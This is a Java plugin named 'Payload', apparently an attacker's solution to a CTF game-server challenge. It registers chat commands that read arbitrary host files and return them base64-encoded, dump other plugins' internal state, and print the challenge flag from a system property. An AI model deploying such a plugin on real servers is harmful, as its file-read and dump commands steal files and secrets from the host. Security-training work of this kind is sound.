import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Map;
import java.util.logging.Logger;
import java.util.Map.Entry;

import java.nio.file.Files;
import java.util.Base64;

import org.hallebarde.recrutement.api.Game;
import org.hallebarde.recrutement.api.Plugin;
import org.hallebarde.recrutement.api.PluginMetadata;
import org.hallebarde.recrutement.api.commands.CommandExecutor;
import org.hallebarde.recrutement.api.gameplay.user.User;
import org.hallebarde.recrutement.commands.DebugCommands;
import org.hallebarde.recrutement.plugins.PluginContainer;
import org.hallebarde.recrutement.util.InternalHelper;



public class Payload implements Plugin {
    private static Payload instance;
    private PluginMetadata metadata;
    private Logger logger;

    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        instance = this;
        this.metadata = metadata;
        this.logger = logger;

        this.logger.info("Attack started version: " + metadata.version());
        System.out.println("We are in !");

        game.registerCommand("check", this::checkState, "Check a few things");
        game.registerCommand("ser", this::serialize, "Serialize a plugin");
        game.registerCommand("b64", this::base64file, "Display the base64 of a file");
        game.registerCommand("p", this::plugins, "Manage plugins");
        game.registerCommand("flag", this::flag, "Get the flag");
    }

    public void checkState(Game game, CommandExecutor commandExecutor, String... strings){
        this.logger.info("Attack started version: " + this.metadata.version());
        
        if (commandExecutor instanceof User user) {
            user.sendMessage("Attack loaded version: " + this.metadata.version());
        }
    }

    public void serialize(Game game, CommandExecutor commandExecutor, String... strings){
        if (strings.length != 2) return;

        if (commandExecutor instanceof User user) {
            this.logger.info("Trying to serialize plugins " + strings[0] + " to " + strings[1]);

            DebugCommands.dumpPluginsCommand(game, commandExecutor, strings);
            // Bad idea: ça ne donne rien d'exploitable sans bytecode
        }
    }

    public void plugins(Game game, CommandExecutor commandExecutor, String... strings){
        if (commandExecutor instanceof User user) {
            if(strings.length == 0){
                user.sendMessage("Usage: /p [list|dump plugin_id]");
                return;
            }
            
            if(strings[0].equals("list")){
                for (Map.Entry<String, Plugin> entry : game.getPlugins().entrySet()) {
                    user.sendMessage(entry.getKey() + ": " + entry.getValue());
                }
                
                return;
            }

            if(strings[0].equals("dump")){
                if(strings.length != 2){
                    user.sendMessage("Usage: /p dump plugin_id");
                    return;
                }

                user.sendMessage("Dump of " + strings[1] + ": ");
                try {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ObjectOutputStream oos = new ObjectOutputStream(baos);
    
                    InternalHelper.getInternalGame(game).getPluginLoader().dumpPlugin(strings[1], oos);
    
                    
                    String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
                    user.sendMessage(base64);
    
                    oos.close();
                    baos.close();
                }catch (IOException e){
                    this.logger.warning("IOExecption on dump plugin");
                }
                
            }
        }
    }

    public void base64file(Game game, CommandExecutor commandExecutor, String... strings){
        if (strings.length != 1) return;

        this.logger.info("Trying to read " + strings[0]);
        try{
            File file = new File(strings[0]);
            
            byte[] content = Files.readAllBytes(file.toPath());
            this.logger.info(content.toString());

            String encoded = Base64.getEncoder().encodeToString(content);

            this.logger.info(encoded);
            if (commandExecutor instanceof User user){
                user.sendMessage(encoded);
            }
        }catch (IOException e){
            this.logger.warning("IOException " + e);
        }
    }

    public void flag(Game game, CommandExecutor commandExecutor, String... strings){
        if (commandExecutor instanceof User user){
            user.sendMessage("Flag: " + System.getProperty("ctf404.flag.cjgJF4GCxj2QD5Lg"));
        }
    }

    @Override
    public void onUnload(Game game) {
        this.logger.info("Attack plugin unloaded!");
    }
}
